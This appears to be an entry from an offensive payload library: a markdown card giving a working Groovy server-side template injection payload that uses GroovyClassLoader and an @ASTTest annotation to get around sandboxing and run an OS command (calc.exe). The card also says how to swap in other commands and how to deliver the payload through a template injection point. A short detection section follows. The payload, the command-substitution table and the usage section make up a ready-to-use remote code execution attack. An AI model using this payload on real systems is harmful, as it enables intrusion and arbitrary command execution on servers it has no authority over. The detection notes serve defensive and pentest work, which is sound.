---
type: code
language: groovy
verified: true
created_at: '2023-04-06T03:56:39.228792+00:00'
updated_at: '2023-04-10T20:23:43.191640+00:00'
tags:
  - groovy
  - ssti
  - sandbox-bypass
  - rce
platforms:
  - Web
  - Java
  - Windows
validated: true
---

# Groovy-ClassLoader-ASTTest-Calculator-Execution

## Code

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

## Description

This Groovy snippet uses GroovyClassLoader to dynamically parse and load a class containing an @ASTTest annotation, which executes 'calc.exe' via Runtime.exec(). It bypasses sandbox restrictions by compiling the malicious class at runtime, enabling RCE in SSTI scenarios. Targeted at Windows environments to launch the calculator as proof of execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "calc.exe" | The system command or application to launch | "notepad.exe" (for text editor) |

## Usage

Deliver via SSTI injection point in a Groovy template (e.g., API parameter: expr='${payload}'). The loader compiles the string as a class, triggering the annotation during evaluation. Ideal for demonstrating graphical RCE in pentests; adapt command for Linux (e.g., 'xcalc').

## Detection

- Log dynamic class loading events in Groovy environments, flagging parseClass calls with suspicious strings.
- Process monitoring for 'calc.exe' spawning from web server processes (e.g., via Sysmon or auditd).
- Input validation rules to block 'GroovyClassLoader' or escaped quotes in payloads.
- Sandbox configurations that prohibit runtime class parsing or annotation processing.

## Related

- [[procedures/Groovy-Sandbox-Bypass-for-Server-Side-Template-Injection]]
